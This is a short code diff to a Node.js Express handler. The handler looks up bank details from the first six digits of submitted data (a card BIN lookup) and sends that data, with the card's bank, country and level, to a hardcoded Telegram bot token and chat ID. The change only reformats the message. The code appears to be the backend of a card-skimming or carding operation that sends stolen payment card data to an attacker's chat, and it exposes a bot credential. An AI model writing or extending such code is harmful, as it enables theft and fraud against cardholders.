@@ -22,7 +22,7 @@ app.post("/", (req, res) => {
     let bin_data = bindata[formattedData.slice(0, 6)];
     let formatted_bin_data = `${bin_data['Country']} | ${bin_data['Bank']} ${bin_data['Processor']} ${bin_data['Rank']} ${bin_data['Level']}`
     fetch(
-      "https://api.telegram.org/bot6675442636:AAEVY8Ol_Bbc5nESoeEup97PLfGXgq0ggaY/sendMessage?chat_id=5307938436&parse_mode=markdown&text=```%0A" + formattedData + "%0A%0A" + formatted_bin_data + "```"
+      "https://api.telegram.org/bot6675442636:AAEVY8Ol_Bbc5nESoeEup97PLfGXgq0ggaY/sendMessage?chat_id=5307938436&parse_mode=markdown&text=```%0A" + '-----------------------------------'  + "%0A" + formattedData + "%0A%0A" + formatted_bin_data + '%0A-----------------------------------' + "```"
     );
     res.json(bin_data);
   } catch (error) {
